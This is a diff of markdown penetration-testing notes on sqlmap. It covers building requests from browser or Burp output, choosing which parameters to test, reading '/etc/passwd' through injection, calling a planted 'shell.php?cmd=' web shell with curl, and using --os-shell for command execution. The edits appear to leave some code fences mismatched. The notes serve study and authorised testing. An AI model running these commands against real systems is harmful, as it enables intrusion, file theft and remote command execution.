@@ -484,27 +484,24 @@ modified: 2025-03-25
 >https://github.com/sqlmapproject/sqlmap/wiki/Usage
 >```
 
->[!code]- Supply a HTTP request
+>[!code]- Generate a request
+>1. Developer Tools > Network > right-click request > Save as cURL
+>2. Burp > right-click request > Copy to file
+
+>[!code]- Provide a HTTP request
 >###### GET request
 >```powershell
-># Dev Tools > Network > Copy request > Copy as cURL > paste into command line > replace cURL with sqlmap
->
+># GET request - generated from Save as cURL Firefox option
 >sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
->```
 >
->###### POST request
->```powershell
-># Both uid and name parameters will be tested
+># POST request
 >sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
 >
-># Only the uid parameter will be tested 
+># Only test the uid parameter
 >sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
 >sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 >
-># Generate a txt file
-># Burp > Copy to file
-># Browser > Network > Copy > Copy Request Headers
-># Use the txt file
+># Use a file (generated via Burp 'Copy to file' option)
 >sqlmap -r req.txt
 >```
 
@@ -705,6 +702,7 @@ modified: 2025-03-25
 >```powershell
 ># The Database Administrator has elevated permissions (helpful for OS exploitation)
 >--is-dba
+>```
 >###### Read local files
 >```powershell
 >--file-read "/etc/passwd"
@@ -724,8 +722,8 @@ modified: 2025-03-25
 ># Access the remote PHP shell to execute a remote command
 >curl http://www.example.com/shell.php?cmd=ls+-la
 >```
+>```
 >###### OS commands
->```powershell
 >--os-shell # attempts various techniques
 >--os-shell --technique=E # uses error-based payloads only
 >```
